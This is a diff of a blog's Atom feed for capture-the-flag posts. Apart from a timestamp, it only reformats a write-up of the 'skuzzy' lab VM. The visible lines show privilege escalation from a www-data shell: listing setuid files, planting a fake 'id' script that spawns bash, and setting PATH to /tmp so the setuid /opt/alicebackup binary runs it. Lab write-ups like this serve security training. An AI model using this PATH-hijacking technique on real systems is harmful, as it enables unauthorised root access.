@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T14:36:48+02:00</updated>
+  <updated>2017-03-28T14:42:23+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -473,9 +473,9 @@ export TERM=xterm
 www-data@skuzzy:/$
 </code></pre>
 
-<p>lets find some setuid files
-<code>
-www-data@skuzzy:/$ find / -perm -4000 2&gt;/dev/null
+<p>Lets find some setuid files</p>
+
+<pre><code>www-data@skuzzy:/$ find / -perm -4000 2&gt;/dev/null
 find / -perm -4000 2&gt;/dev/null
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
@@ -501,7 +501,7 @@ find / -perm -4000 2&gt;/dev/null
 /bin/ping6
 /bin/umount
 /opt/alicebackup
-</code></p>
+</code></pre>
 
 <p>/opt/alicebackup looks interesting, running it we can see it runs the id command before trying to connect to alice.home</p>
 
@@ -512,14 +512,14 @@ ssh: Could not resolve hosdtname alice.home: Name or service not known
 lost connection
 </code></pre>
 
-<p>lets create our own id command</p>
+<p>Lets create our own id command</p>
 
 <pre><code>cat /tmp/id
 #!/bin/bash
 /bin/bash
 </code></pre>
 
-<p>change our path so it gets called</p>
+<p>Change our path so it gets called</p>
 
 <pre><code>export PATH=/tmp
 </code></pre>
